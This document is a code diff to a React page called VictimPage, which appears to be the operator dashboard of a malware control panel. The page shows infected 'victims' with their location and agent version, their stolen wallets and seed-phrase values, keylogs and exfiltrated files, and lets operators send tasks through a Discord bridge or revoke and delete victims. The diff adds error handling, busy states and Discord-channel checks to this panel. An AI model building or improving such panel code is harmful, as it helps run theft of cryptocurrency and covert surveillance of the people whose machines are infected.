@@ -27,8 +27,10 @@ export default function VictimPage() {
   const [dialog, setDialog] = useState(false);
   const [tagsOpen, setTagsOpen] = useState(false);
   const [tagText, setTagText] = useState('');
+  const [busy, setBusy] = useState('');
   const canWrite = useCanWrite();
   const role = useRole();
+  const bridge = useApi<{ enabled: boolean }>('/discord/status', { pollMs: 30_000 });
   const victim = useApi<Victim>(`/victims/${id}`, { pollMs: 10_000 });
   const wallets = useApi<{ items: Wallet[] }>(`/victims/${id}/wallets`, { pollMs: 10_000 });
   const seeds = useApi<{ items: Array<{ id: string; path: string; type: string; words: number; value: string; createdAt: string }> }>(`/victims/${id}/seeds`, { pollMs: 15_000 });
@@ -45,23 +47,49 @@ export default function VictimPage() {
   if (!data) return <div className="p-4"><SkeletonRows rows={14} /></div>;
 
   async function revoke() {
-    await mutate(`/victims/${id}/revoke`, 'POST');
-    toast.success('Revocation toggled');
-    victim.refresh();
+    setBusy('revoke');
+    try {
+      await mutate(`/victims/${id}/revoke`, 'POST');
+      toast.success('Revocation toggled');
+      victim.refresh();
+    } catch (caught) {
+      toast.error(caught instanceof Error ? caught.message : 'revoke failed');
+    } finally {
+      setBusy('');
+    }
   }
 
   async function remove() {
-    if (!confirm('Delete this victim and all material?')) return;
-    await mutate(`/victims/${id}`, 'DELETE');
-    router.push('/victims');
+    const message = data?.discordChannel
+      ? 'Delete this victim and all material? The Discord channel will be ignored and not recreated until you re-link it.'
+      : 'Delete this victim and all material?';
+    if (!confirm(message)) return;
+    setBusy('delete');
+    try {
+      await mutate(`/victims/${id}`, 'DELETE');
+      toast.success(data?.discordChannel ? 'Victim deleted and channel unlinked' : 'Victim deleted');
+      router.push('/victims');
+    } catch (caught) {
+      toast.error(caught instanceof Error ? caught.message : 'delete failed');
+      setBusy('');
+    }
   }
 
   async function saveTags(event: React.FormEvent) {
     event.preventDefault();
-    await mutate(`/victims/${id}`, 'PATCH', { tags: tagText.split(',').map((tag) => tag.trim()).filter(Boolean) });
-    setTagsOpen(false);
-    victim.refresh();
+    setBusy('tags');
+    try {
+      await mutate(`/victims/${id}`, 'PATCH', { tags: tagText.split(',').map((tag) => tag.trim()).filter(Boolean) });
+      setTagsOpen(false);
+      victim.refresh();
+    } catch (caught) {
+      toast.error(caught instanceof Error ? caught.message : 'save failed');
+    } finally {
+      setBusy('');
+    }
   }
+
+  const taskBlocked = Boolean(bridge.data?.enabled) && !data.discordChannel;
 
   return (
     <>
@@ -71,13 +99,14 @@ export default function VictimPage() {
           <Badge tone={data.online ? 'ok' : data.revokedAt ? 'bad' : 'warn'}>{data.online ? 'online' : data.status === 'online' ? 'stale' : data.status}</Badge>
           <Badge tone="brand">{data.profile}</Badge>
           {data.discordChannel ? <Badge tone="brand">discord</Badge> : <Badge>api</Badge>}
+          {data.discordMissingAt ? <Badge tone="bad" title="Recreate the channel in Discord or re-link it from Victims">channel missing</Badge> : null}
           <Badge>{data.agentVersion || 'no version'}</Badge>
           <span className="font-mono text-2xs text-muted">{short(data.id)} · {flag(data.countryCode)} {data.country ?? 'unknown'} {data.city ? `· ${data.city}` : ''}</span>
           <div className="ml-auto flex gap-1.5">
-            <Button size="sm" variant="secondary" disabled={!canWrite} onClick={() => setDialog(true)}><TerminalSquare className="h-3 w-3" /> task</Button>
-            <Button size="sm" variant="secondary" disabled={!canWrite} onClick={() => { setTagText(data.tags.join(', ')); setTagsOpen(true); }}><Tag className="h-3 w-3" /> tags</Button>
-            <Button size="sm" variant="secondary" disabled={!canWrite} onClick={revoke}><Power className="h-3 w-3" /> {data.revokedAt ? 'restore' : 'revoke'}</Button>
-            <Button size="sm" variant="destructive" disabled={role !== 'admin'} onClick={remove}><Trash2 className="h-3 w-3" /></Button>
+            <Button size="sm" variant="secondary" disabled={!canWrite || taskBlocked || busy === 'task'} title={taskBlocked ? 'Victim has no Discord channel' : undefined} onClick={() => setDialog(true)}><TerminalSquare className="h-3 w-3" /> task</Button>
+            <Button size="sm" variant="secondary" disabled={!canWrite || busy === 'tags'} loading={busy === 'tags'} onClick={() => { setTagText(data.tags.join(', ')); setTagsOpen(true); }}><Tag className="h-3 w-3" /> tags</Button>
+            <Button size="sm" variant="secondary" disabled={!canWrite || busy === 'revoke'} loading={busy === 'revoke'} onClick={revoke}><Power className="h-3 w-3" /> {data.revokedAt ? 'restore' : 'revoke'}</Button>
+            <Button size="sm" variant="destructive" disabled={role !== 'admin' || busy === 'delete'} loading={busy === 'delete'} onClick={remove} title="delete and unlink"><Trash2 className="h-3 w-3" /></Button>
           </div>
         </div>
 
@@ -154,7 +183,7 @@ export default function VictimPage() {
           </TabsContent>
 
           <TabsContent value="wallets" className="pt-3">
-            <Card><WalletTable victimId={id} items={wallets.data?.items ?? []} loading={wallets.loading} refresh={wallets.refresh} /></Card>
+            <Card><WalletTable victimId={id} items={wallets.data?.items ?? []} loading={wallets.loading} refresh={wallets.refresh} linked={!taskBlocked} /></Card>
           </TabsContent>
 
           <TabsContent value="seeds" className="pt-3">
@@ -180,7 +209,7 @@ export default function VictimPage() {
           </TabsContent>
 
           <TabsContent value="files" className="pt-3">
-            <Card>{files.error ? <ErrorState message={files.error.message} retry={files.refresh} /> : <FileTree artifacts={files.data?.artifacts ?? []} />}</Card>
+            <Card>{files.error ? <ErrorState message={files.error.message} retry={files.refresh} /> : <FileTree artifacts={files.data?.artifacts ?? []} onDeleted={files.refresh} />}</Card>
           </TabsContent>
 
           <TabsContent value="keylogs" className="pt-3">
